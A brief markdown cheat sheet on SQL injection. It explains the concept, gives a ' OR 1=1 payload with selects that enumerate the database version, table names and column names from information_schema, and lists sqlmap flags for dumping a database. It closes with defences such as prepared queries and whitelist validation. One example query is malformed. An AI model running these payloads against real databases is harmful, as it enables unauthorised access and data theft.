# SQL injections

**Concept**
* consists of sending data to an application that will generate a bug
* uses strings and interprets them as commands
* allows access and modification of the DB

Example command: `' OR 1=1 {option}#`

{option} :
```sql
select null, version()
select null, table_name from information_schema.tables # retrieve tables from the DB
select null, column_name from information_schema.columns where information_schema.tables='[name]'
```

## Tools

### SQLMAP

* -u : "url"
* --cookie="PHPSESSID=.... ; security=low"
* --dump : dumper the DB


## Protect yourself from it:
* avoid interpreters
* encode the data provided by the user before passing it to the interpreter
* perform white list validation on user data
* minimise DB privileges
* prepared queries
